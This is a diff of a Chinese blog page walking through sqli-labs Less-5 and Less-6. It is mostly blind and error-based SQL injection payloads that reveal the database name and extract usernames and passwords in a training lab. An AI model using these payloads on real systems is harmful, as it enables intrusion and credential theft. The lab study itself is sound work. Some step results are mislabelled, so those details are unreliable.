+<pre class=" language-mysql"><code class="language-mysql">http://192.168.0.666/Less-5/?id=1' and left(database(),3) > 'sea' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),3) > 'seb' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),3) > 'sec' %23 [x]
+http://192.168.0.666/Less-5/?id=1' and left(database(),3) > 'sed' %23 [x]
+</code></pre>
+<p>得出第三个字符为<code>c</code></p>
+<hr>
+<p>猜测数据库名第四个字符</p>
+<pre class=" language-mysql"><code class="language-mysql">http://192.168.0.666/Less-5/?id=1' and left(database(),4) > 'seca' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),4) > 'secb' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),4) > 'secc' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),4) > 'secd' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),4) > 'sece' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),4) > 'secf' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),4) > 'secg' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),4) > 'sech' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),4) > 'seci' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),4) > 'secj' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),4) > 'seck' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),4) > 'secl' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),4) > 'secm' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),4) > 'secn' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),4) > 'seco' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),4) > 'secp' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),4) > 'secq' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),4) > 'secr' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),4) > 'secs' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),4) > 'sect' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),4) > 'secu' %23 [x]
+</code></pre>
+<p>得到第四个字符为<code>u</code></p>
+<hr>
+<p>猜测数据库名第五个字符</p>
+<pre class=" language-mysql"><code class="language-mysql">http://192.168.0.666/Less-5/?id=1' and left(database(),5) > 'secua' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),5) > 'secub' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),5) > 'secuc' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),5) > 'secud' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),5) > 'secue' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),5) > 'secuf' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),5) > 'secug' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),5) > 'secuh' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),5) > 'secui' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),5) > 'secuj' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),5) > 'secuk' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),5) > 'secul' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),5) > 'secum' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),5) > 'secun' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),5) > 'secuo' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),5) > 'secup' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),5) > 'secuq' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),5) > 'secur' %23 [x]
+</code></pre>
+<p>得到第五个字符为<code>r</code></p>
+<hr>
+<p>猜测数据库名第六个字符</p>
+<pre class=" language-mysql"><code class="language-mysql">http://192.168.0.666/Less-5/?id=1' and left(database(),6) > 'secura' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),6) > 'securb' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),6) > 'securc' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),6) > 'securd' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),6) > 'secure' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),6) > 'securf' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),6) > 'securg' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),6) > 'securh' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),6) > 'securi' %23 [x]
+</code></pre>
+<p>得到第六个字符为<code>i</code></p>
+<hr>
+<p>猜测数据库名第七个字符</p>
+<pre class=" language-mysql"><code class="language-mysql">http://192.168.0.666/Less-5/?id=1' and left(database(),7) > 'securia' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),7) > 'securib' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),7) > 'securic' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),7) > 'securid' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),7) > 'securie' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),7) > 'securif' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),7) > 'securig' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),7) > 'securih' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),7) > 'securii' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),7) > 'securij' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),7) > 'securik' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),7) > 'securil' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),7) > 'securim' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),7) > 'securin' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),7) > 'securio' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),7) > 'securip' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),7) > 'securiq' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),7) > 'securir' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),7) > 'securis' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),7) > 'securit' %23 [x]
+</code></pre>
+<p>得到第七个字符为<code>i</code></p>
+<hr>
+<p>猜测数据库名第八个字符</p>
+<pre class=" language-mysql"><code class="language-mysql">http://192.168.0.666/Less-5/?id=1' and left(database(),8) > 'securita' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),8) > 'securitb' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),8) > 'securitc' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),8) > 'securitd' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),8) > 'securite' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),8) > 'securitf' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),8) > 'securitg' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),8) > 'securith' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),8) > 'securiti' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),8) > 'securitj' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),8) > 'securitk' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),8) > 'securitl' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),8) > 'securitm' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),8) > 'securitn' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),8) > 'securito' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),8) > 'securitp' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),8) > 'securitq' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),8) > 'securitr' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),8) > 'securits' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),8) > 'securitt' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),8) > 'securitu' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),8) > 'securitv' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),8) > 'securitw' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),8) > 'securitx' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),8) > 'security' %23 [x]
+http://192.168.0.666/Less-5/?id=1' and left(database(),8) > 'securitz' %23 [x]
+</code></pre>
+<p>得到第七个字符为<code>y</code></p>
+<p><font color="red" size="12">Security</font></p>
+<blockquote>
+<p>可能有人会说，这不得累死人啊，你可以使用二分法或逐跳测，先测一下a，再测一下z，然后分半探测，你因为我这一个一个弄的是为了好看啊，所以说我这不是为了好看才弄的吗。也可以很好的理解盲注，享受盲注这种最朴实的测试，工具用多了吧，手注不会了吧。</p>
+</blockquote>
+<p>同样，我们可以用length()函数猜解获得数据库的长度为8位。</p>
+<p><strong>利用left()函数猜测版本信息</strong></p>
+<p><code>http://192.168.0.666/Less-5/?id=1' and left(version(),1)=5 %23</code> 返回正常</p>
+<p><code>http://192.168.0.666/Less-5/?id=1' and left(version(),1)=4 %23</code> 返回错误</p>
+<p>所以初步判定，这是5.0版本的数据库。</p>
+<p><strong>猜测数据库表信息</strong></p>
+<pre class=" language-mysql"><code class="language-mysql">http://127.0.0.1/sqli-labs-master/Less-5/
+?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema = database() limit a,1)b,1))>n
+a - 从0开始第几张表
+b - 第几个字符
+n - ASCII对应十进制
+</code></pre>
+<p>这就要用工具了，用Burp爆破表、字段、数据。</p>
+<h4 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h4><p>第六关与第五个一样，显示You are in，单引号无效，所以测试双引号，其它与第五题相同。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/image-20220430010518467.png"></p>
+<p>那我就不客气了，直接窃取第五题超过，拿来验证最后一步。</p>
+<p><code>http://192.168.0.666/Less-6?id=1" union select 1,2,(updatexml(1,concat(1,(select username from users limit 0,1),1,(select password from users limit 0,1)),1)) %23</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/image-20220430010844633.png"></p>
+<p><code>http://192.168.0.666/Less-6?id=-1" union select count(*),1, concat('^',(select concat(username,0x3a,password) from users limit 0,1),'^',floor(rand()*2)) a from information_schema.tables group by a %23</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/image-20220430011102199.png"></p>
+<p>下期见</p>
+<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p>[1] <a target="_blank" rel="noopener" href="https://www.csdn.net/tags/MtTaEg0sNDc2MzI2LWJsb2cO0O0O.html">https://www.csdn.net/tags/MtTaEg0sNDc2MzI2LWJsb2cO0O0O.html</a></p>
+<p>[2] <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45634365/article/details/114190376">https://blog.csdn.net/weixin_45634365/article/details/114190376</a></p>
 <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">
                 
             </div>
@@ -1072,10 +1440,9 @@ $<span class="token keyword">row</span> <span class="token operator">=</span> my
                 <a href="/posts/bf79.html">
                     <div class="card-image">
                         
+                        <img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/image-20220430011532521.png" class="responsive-img" alt="Sqli-labs训练营[1-6]">
                         
-                        <img src="https://cdn.jsdelivr.net/gh/enomothem/cdn@1.5.0/sources/medias/featureimages/23.jpg" class="responsive-img" alt="Sqli-labs训练营">
-                        
-                        <span class="card-title">Sqli-labs训练营</span>
+                        <span class="card-title">Sqli-labs训练营[1-6]</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1446,7 +1813,7 @@ $<span class="token keyword">row</span> <span class="token operator">=</span> my
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">238.1k</span>&nbsp;字
+                class="white-color">242.4k</span>&nbsp;字
             
             
             
